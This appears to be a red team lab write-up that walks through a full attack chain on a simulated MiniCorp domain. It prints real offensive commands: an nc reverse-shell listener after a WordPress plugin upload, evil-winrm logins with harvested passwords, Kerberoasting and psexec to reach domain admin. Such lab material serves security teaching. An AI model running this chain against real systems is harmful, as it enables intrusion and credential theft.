# ⚔️ MiniCorp Red Team Attack Walkthrough

This document describes the full attack chain performed during the MiniCorp red team simulation.

Objective: Compromise the corporate domain starting from external access.

---

# Phase 1 — External Reconnaissance

The engagement began from the perspective of an external attacker.

Network scan performed:

nmap -sC -sV 192.168.56.10

Results identified:

* HTTP service running Apache
* WordPress application detected

Directory brute forcing:

ffuf -u http://192.168.56.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

Discovery:
WordPress installation and plugin directories.

---

# Phase 2 — Initial Access (Web Exploitation)

The WordPress site was tested using WPScan.

A vulnerable plugin was identified:
WP File Manager (outdated version).

The vulnerability allowed arbitrary file upload.

A PHP reverse shell was uploaded and executed.

Listener started:

nc -lvnp 4444

Result:
Reverse shell obtained on Ubuntu web server.

Initial foothold achieved.

---

# Phase 3 — Credential Harvesting

Post-exploitation enumeration performed on the web server.

Sensitive file discovered:

/var/www/html/config_backup.txt

Contents revealed credential reuse:

john / Password123

These credentials appeared to belong to an internal employee.

---

# Phase 4 — Internal Network Pivot

Using discovered credentials, remote access to the Domain Controller was attempted.

evil-winrm -i 192.168.56.20 -u john -p Password123

Result:
Successful access to Windows domain environment.

Internal network compromise achieved.

---

# Phase 5 — Active Directory Enumeration

Kerberos service accounts were enumerated.

Command used:

GetUserSPNs.py minicorp.local/john:Password123 -request

A Kerberoastable service account was identified:
svc_backup

Service ticket hash extracted.

---

# Phase 6 — Password Cracking

Hash cracked using Hashcat.

Recovered credentials:

svc_backup / Backup123!

---

# Phase 7 — Privilege Escalation

Using service account credentials, administrative access was attempted.

psexec.py minicorp.local/svc_backup:Backup123!@192.168.56.20

Result:
Domain Administrator access obtained.

---

# 🏆 Final Impact

The attacker achieved full compromise of:

* Domain Controller
* Active Directory
* Corporate credentials

MiniCorp domain fully compromised.

---

# Lessons Learned

Key security failures identified:

* Vulnerable public web application
* Credential reuse across services
* Weak service account password
* Lack of network segmentation

These weaknesses enabled full domain takeover.
